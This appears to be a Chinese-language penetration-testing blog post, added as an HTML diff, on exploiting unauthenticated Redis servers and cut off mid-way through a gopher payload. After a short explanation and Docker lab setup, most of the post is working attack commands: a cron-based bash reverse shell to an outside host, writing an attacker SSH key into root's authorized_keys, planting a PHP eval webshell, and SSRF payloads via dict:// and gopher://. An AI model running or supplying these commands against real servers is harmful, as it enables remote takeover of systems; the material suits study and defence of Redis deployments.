@@ -1,0 +1,777 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.jpg">
+  <link rel="icon" href="/img/fluid.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Ledraw">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="redis原理Redis 本身是一个高性能的键值数据库，默认设计用于可信内网环境，早期版本和默认配置没有开启认证、也没有访问控制。如果 Redis 被直接暴露在公网且未设置密码&#x2F;访问控制，攻击者可以不经认证直接连接 Redis 服务器并执行任意命令，从而导致系统被完全控制。  🟥 一、漏洞产生的根本原因  无认证机制（默认） Redis 默认不要求登录，也不强制配置 requirepa">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Redis(未授权)">
+<meta property="og:url" content="https://ledraw.github.io/2025/09/22/Redis-%E6%9C%AA%E6%8E%88%E6%9D%83/index.html">
+<meta property="og:site_name" content="Leraw">
+<meta property="og:description" content="redis原理Redis 本身是一个高性能的键值数据库，默认设计用于可信内网环境，早期版本和默认配置没有开启认证、也没有访问控制。如果 Redis 被直接暴露在公网且未设置密码&#x2F;访问控制，攻击者可以不经认证直接连接 Redis 服务器并执行任意命令，从而导致系统被完全控制。  🟥 一、漏洞产生的根本原因  无认证机制（默认） Redis 默认不要求登录，也不强制配置 requirepa">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-09-22T13:07:59.000Z">
+<meta property="article:modified_time" content="2025-09-22T13:14:33.310Z">
+<meta property="article:author" content="Ledraw">
+<meta property="article:tag" content="redis">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>Redis(未授权) - Leraw</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"ledraw.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"QCVIJ3SAgMvsfkMCYxf8ZDQ1-gzGzoHsz","app_key":"JJ625pCS83I2kEAzb5GRdt4f","server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Ledraw</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Redis(未授权)"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-09-22 21:07" pubdate>
+          2025年9月22日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          19 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Redis(未授权)</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="redis"><a href="#redis" class="headerlink" title="redis"></a>redis</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>Redis 本身是一个<strong>高性能的键值数据库</strong>，默认设计用于<strong>可信内网环境</strong>，早期版本和默认配置<strong>没有开启认证、也没有访问控制</strong>。如果 Redis 被<strong>直接暴露在公网</strong>且<strong>未设置密码&#x2F;访问控制</strong>，攻击者可以<strong>不经认证直接连接 Redis 服务器并执行任意命令</strong>，从而导致系统被完全控制。</p>
+<hr>
+<p>🟥 一、漏洞产生的根本原因</p>
+<ol>
+<li><strong>无认证机制（默认）</strong><ul>
+<li>Redis 默认不要求登录，也不强制配置 <code>requirepass</code>。</li>
+<li>任何人只要能访问到 6379 端口，就能直接执行 <code>SET/GET/CONFIG/SLAVEOF</code> 等高权限命令。</li>
+</ul>
+</li>
+<li><strong>缺乏访问控制</strong><ul>
+<li>Redis 默认监听 <code>0.0.0.0:6379</code>，即所有网卡地址。</li>
+<li>未配置 <code>bind 127.0.0.1</code> 和 <code>protected-mode yes</code>，导致公网可直接访问。</li>
+</ul>
+</li>
+<li><strong>命令权限过高</strong><ul>
+<li>Redis 没有细粒度权限控制，一旦接入就拥有<strong>完全控制权</strong>（读写任意数据、修改配置、加载模块等）。</li>
+</ul>
+</li>
+</ol>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="docker设置代理"><a href="#docker设置代理" class="headerlink" title="docker设置代理"></a>docker设置代理</h3><p>1、在 Docker 的配置文件中设置代理</p>
+<p>编辑 Docker 配置文件 <code>/etc/systemd/system/docker.service.d/http-proxy.conf</code>（如果没有该文件，您可以手动创建它）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">mkdir</span> -p /etc/systemd/system/docker.service.d<br><span class="hljs-built_in">sudo</span> vim /etc/systemd/system/docker.service.d/http-proxy.conf<br></code></pre></td></tr></table></figure>
+
+<p>2、将以下内容添加到文件中，设置正确的代理地址</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Service]</span><br><span class="hljs-attr">Environment</span>=<span class="hljs-string">&quot;HTTP_PROXY=http://主节点IP:7890&quot;</span><br><span class="hljs-attr">Environment</span>=<span class="hljs-string">&quot;HTTPS_PROXY=http://主节点IP:7890&quot;</span><br><span class="hljs-attr">Environment</span>=<span class="hljs-string">&quot;NO_PROXY=localhost,127.0.0.1&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>查看镜像中的Redis</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">docker search redis</span><br></code></pre></td></tr></table></figure>
+
+<p>拉取镜像</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> pull redis:<span class="hljs-number">6</span>.<span class="hljs-number">0</span>.<span class="hljs-number">8</span><br></code></pre></td></tr></table></figure>
+
+<p>Redis常见的命令</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs csharp">redis-cli -h ip -p <span class="hljs-number">6379</span> -a passwd   <span class="hljs-meta"># 外部连接,Redis 的连接除了通过指定 IP，也可以通过指定域名</span><br>info 								  <span class="hljs-meta"># 查看相关redis信息</span><br><span class="hljs-keyword">set</span> xz <span class="hljs-string">&quot;Hacker&quot;</span>                     <span class="hljs-meta"># 设置键xz的值为字符串Hacker</span><br><span class="hljs-keyword">get</span> xz                              <span class="hljs-meta"># 获取键xz的内容</span><br>INCR score                          <span class="hljs-meta"># 使用INCR命令将score的值增加1</span><br>keys *                              <span class="hljs-meta"># 列出当前数据库中所有的键</span><br>config <span class="hljs-keyword">set</span> <span class="hljs-keyword">protected</span>-mode no        <span class="hljs-meta"># 关闭安全模式</span><br><span class="hljs-keyword">get</span> anotherkey                      <span class="hljs-meta"># 获取一个不存在的键的值</span><br>config <span class="hljs-keyword">set</span> dir /root/redis          <span class="hljs-meta"># 设置保存目录</span><br>config <span class="hljs-keyword">set</span> dbfilename redis.rdb     <span class="hljs-meta"># 设置保存文件名</span><br>config <span class="hljs-keyword">get</span> dir                      <span class="hljs-meta"># 查看保存目录</span><br>config <span class="hljs-keyword">get</span> dbfilename               <span class="hljs-meta"># 查看保存文件名</span><br>save                                <span class="hljs-meta"># 进行一次备份操作</span><br>flushall                            <span class="hljs-meta"># 删除所有数据</span><br>del key                             <span class="hljs-meta"># 删除键为key的数据</span><br>slaveof ip port   					<span class="hljs-meta"># 设置主从关系</span><br>mset k1 v1 k2 v2 k3 v3   <span class="hljs-meta">#批量设置键值对</span><br>mget k1 k2 k3 		<span class="hljs-meta">#批量获取键值对</span><br>使用SET和GET命令，可以完成基本的赋值和取值操作；<br>Redis是不区分命令的大小写的，<span class="hljs-keyword">set</span>和SET是同一个意思；<br>使用keys *可以列出当前数据库中的所有键；<br>当尝试获取一个不存在的键的值时，Redis会返回空，即(nil)；<br>如果键的值中有空格，需要使用双引号括起来，如<span class="hljs-string">&quot;Hello World&quot;</span>;<br></code></pre></td></tr></table></figure>
+
+<p>Redis 配置文件参数</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs stata">port参数：<br>    格式为port后面接端口号，如port 6379，表示Redis服务器将在6379端口上进行监听来等待客户端的连接。<br><br>bind参数：<br>    格式为bind后面接IP地址，可以同时绑定在多个IP地址上，IP地址之间用空格分离，如bind 192.168.47.173 10.0.0.1，表允许192.168.47.173和10.0.0.1两个IP连接。如果设置为0.0.0.0则表示任意ip都可连接，说白了就是白名单。<br><br><span class="hljs-keyword">save</span>参数：<br>    格式为<span class="hljs-keyword">save</span> &lt;秒数&gt; &lt;变化数&gt;，表示在指定的秒数内数据库存在指定的改变数时自动进行备份（Redis是内存数据库，这里的备份就是指把内存中的数据备份到磁盘上）。可以同时指定多个<span class="hljs-keyword">save</span>参数，如：<br>        <span class="hljs-keyword">save</span> 900 1<br>        <span class="hljs-keyword">save</span> 300 10<br>        <span class="hljs-keyword">save</span> 60 10000<br>    表示如果数据库的内容在60秒后产生了10000次改变，或者300秒后产生了10次改变，或者900秒后产生了1次改变，那么立即进行备份操作。<br><br>requirepass参数：<br>    格式为requirepass后接指定的密码，用于指定客户端在连接Redis服务器时所使用的密码。Redis默认的密码参数是空的，说明不需要密码即可连接；同时，配置文件有一条注释了的requirepass foobared命令，如果去掉注释，表示需要使用foobared密码才能连接Redis数据库。<br><br><span class="hljs-keyword">dir</span>参数：<br>    格式为<span class="hljs-keyword">dir</span>后接指定的路径，默认为<span class="hljs-keyword">dir</span> ./，指明Redis的工作目录为当前目录，即redis-server文件所在的目录。注意，Redis产生的备份文件将放在这个目录下。<br><br>dbfilename参数：<br>    格式为dbfilename后接指定的文件名称，用于指定Redis备份文件的名字，默认为dbfilename dump.rdb，即备份文件的名字为dump.rdb。<br><br>config命令：<br>    通过config命令可以读取和设置<span class="hljs-keyword">dir</span>参数以及dbfilename参数，因为这条命令比较危险（实验将进行详细介绍），所以Redis在配置文件中提供了<span class="hljs-keyword">rename</span>-command参数来对其进行重命名操作，如<span class="hljs-keyword">rename</span>-command CONFIG HTCMD，可以将CONFIG命令重命名为HTCMD。配置文件默认是没有对CONFIG命令进行重命名操作的。<br><br>protected-mode参数：<br>    redis3.2之后添加了protected-mode安全模式，默认值为yes，开启后禁止外部连接，所以在测试时，先在配置中修改为<span class="hljs-keyword">no</span>。<br></code></pre></td></tr></table></figure>
+
+<h2 id="getshell方法"><a href="#getshell方法" class="headerlink" title="getshell方法"></a>getshell方法</h2><h3 id="计划任务反弹shell"><a href="#计划任务反弹shell" class="headerlink" title="计划任务反弹shell"></a>计划任务反弹shell</h3><p>利用工具redis-ctl连接并查看相关信息为4.0.2版本</p>
+
+
+<p>设置计划任务</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">set</span> x <span class="hljs-string">&quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.32.115/4000 0&gt;&amp;1\n&quot;</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">config </span><span class="hljs-built_in">set</span> dir /var/spool/cron/<span class="hljs-built_in"></span><br><span class="hljs-built_in">config </span><span class="hljs-built_in">set</span> dbfilename root<br>save<br></code></pre></td></tr></table></figure>
+
+<p>复现失败</p>
+
+
+<h3 id="写ssh公钥"><a href="#写ssh公钥" class="headerlink" title="写ssh公钥"></a>写ssh公钥</h3><p>首先我们需要在攻击机上生成ssh公钥和私钥，密码设置为空</p>
+<p><strong>ssh-keygen -t rsa</strong></p>
+<p>将公钥写入key.txt当中（文件名无限制）</p>
+<p>(echo -e “\n\n”; cat id_rsa.pub; echo -e “\n\n”) &gt; key.txt</p>
+<p>导入内容（防止乱码）</p>
+<p>cat key.txt| redis-cli -h 192.168.32.210 -x set putsshkey</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#设置路径</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">config </span><span class="hljs-built_in">set</span> dir /root/.ssh<br><span class="hljs-comment">#设置文件名</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">config </span><span class="hljs-built_in">set</span> dbfilename authorized_keys<br><span class="hljs-comment">#保存key值到root文件中</span><br>save<br></code></pre></td></tr></table></figure>
+
+<h4 id="写入webshell远程连接服务器"><a href="#写入webshell远程连接服务器" class="headerlink" title="写入webshell远程连接服务器"></a>写入webshell远程连接服务器</h4><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">#设置木马</span><br><span class="language-xml">set xxx &quot;\n\n</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;x&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">\n\n&quot;</span><br><span class="language-xml">#然后修改路径为网站默认路径</span><br><span class="language-xml">config set dir /var/www/html</span><br><span class="language-xml">#设置文件名</span><br><span class="language-xml">config set dbfilename shell.php</span><br><span class="language-xml">#最后save保存进去</span><br><span class="language-xml">save</span><br></code></pre></td></tr></table></figure>
+
+<p>利用条件</p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs scss">知道网站根目录绝对路径（实际渗透过程中，这个方法通常需要搭配 <span class="hljs-built_in">phpinfo</span>() 等方法使用。）<br>无需是 root 起的 Redis<br>可适用于 Windows（非 ssh 连接）<br>一般无需 flushall 清空数据库（一定情况下也需要）<br></code></pre></td></tr></table></figure>
+
+<h3 id="主从复制"><a href="#主从复制" class="headerlink" title="主从复制"></a>主从复制</h3><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">#在从机上设置主机<br><span class="hljs-number">127.0.0.1:6380</span>&gt; slaveof <span class="hljs-number">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span> <span class="hljs-number">6381</span><br>OK<br>#在主机上设置键值对<br><span class="hljs-number">127.0.0.1:6381</span>&gt; set sean sheep<br>OK<br>#在从机上获取键值对<br><span class="hljs-number">127.0.0.1:6380</span>&gt; get sean<br><span class="hljs-string">&quot;sheep&quot;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-comment">#先设置好保存的路径和保存的文件名</span><br><span class="hljs-symbol">dict:</span>/<span class="hljs-regexp">/192.168.33.134:6379/slaveof</span><span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">33.131</span><span class="hljs-symbol">:</span><span class="hljs-number">6379</span> <br><span class="hljs-symbol">dict:</span>/<span class="hljs-regexp">/192.168.33.134:6379/config</span><span class="hljs-symbol">:set</span><span class="hljs-symbol">:dir</span><span class="hljs-symbol">:/www/admin/localhost_80/wwwroot</span><br><span class="hljs-symbol">dict:</span>/<span class="hljs-regexp">/192.168.33.134:6379/config</span><span class="hljs-symbol">:set</span><span class="hljs-symbol">:dbfilename</span><span class="hljs-symbol">:ssrf</span>.php<br><span class="hljs-comment">#然后进入主机进行主从复制操作，方法和上面的一样</span><br><span class="hljs-meta prompt_">127.0.0.1:6379&gt;</span> set xxx <span class="hljs-string">&quot;\n\n\n&lt;?php phpinfo() ;?&gt;\n\n\n&quot;</span><br><span class="hljs-comment">#再去web端执行save操作</span><br><span class="hljs-symbol">dict:</span>/<span class="hljs-regexp">/192.168.33.134:6379/save</span><br><span class="hljs-comment">#这样数据直接回同步到目标机，从而写入文件</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="SSRF-Redis未授权"><a href="#SSRF-Redis未授权" class="headerlink" title="SSRF+Redis未授权"></a>SSRF+Redis未授权</h2><h3 id="gopher协议"><a href="#gopher协议" class="headerlink" title="gopher协议"></a>gopher协议</h3><p>gopher协议和dict协议一样需要使用redis内置的命令进行文件写入，只是payload更加复杂</p>
+<p>我这里就用写入webshell来演示</p>
+<p>下面这些是我们需要执行的命令</p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">flushall</span><br><span class="language-xml">set 1 &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;</span><br><span class="language-xml">config set dir /tmp</span><br><span class="language-xml">config set dbfilename shell.php</span><br><span class="language-xml">save</span><br></code></pre></td></tr></table></figure>
+
+<p>这里我使用的是 <a target="_blank" rel="noopener" href="https://github.com/firebroo/sec_tools">https://github.com/firebroo/sec_tools</a> 工具</p>
+<p>将上述执行的命令写入<code>redis.cmd</code>中</p>
+<p>保存好后执行<code>python2 redis-over-gopher.py</code></p>
+
+
+<p>生成payload后，若在在bp中还需要将payload再进行一次url编码</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">gopher:</span>//<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">6379</span>/_<span class="hljs-variable">%2</span>a<span class="hljs-variable">%31</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%24</span><span class="hljs-variable">%38</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%66</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%75</span><span class="hljs-variable">%73</span><span class="hljs-variable">%68</span><span class="hljs-variable">%61</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%2</span>a<span class="hljs-variable">%33</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%24</span><span class="hljs-variable">%33</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%73</span><span class="hljs-variable">%65</span><span class="hljs-variable">%74</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%24</span><span class="hljs-variable">%31</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%31</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%24</span><span class="hljs-variable">%31</span><span class="hljs-variable">%38</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%3</span><span class="hljs-keyword">c</span><span class="hljs-variable">%3</span>f<span class="hljs-variable">%70</span><span class="hljs-variable">%68</span><span class="hljs-variable">%70</span><span class="hljs-variable">%20</span><span class="hljs-variable">%70</span><span class="hljs-variable">%68</span><span class="hljs-variable">%70</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%66</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%28</span><span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%3</span>f<span class="hljs-variable">%3</span>e<span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%2</span>a<span class="hljs-variable">%34</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%24</span><span class="hljs-variable">%36</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span>e<span class="hljs-variable">%66</span><span class="hljs-variable">%69</span><span class="hljs-variable">%67</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%24</span><span class="hljs-variable">%33</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%73</span><span class="hljs-variable">%65</span><span class="hljs-variable">%74</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%24</span><span class="hljs-variable">%33</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%64</span><span class="hljs-variable">%69</span><span class="hljs-variable">%72</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%24</span><span class="hljs-variable">%34</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%2</span>f<span class="hljs-variable">%74</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%70</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%2</span>a<span class="hljs-variable">%34</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%24</span><span class="hljs-variable">%36</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span>e<span class="hljs-variable">%66</span><span class="hljs-variable">%69</span><span class="hljs-variable">%67</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%24</span><span class="hljs-variable">%33</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%73</span><span 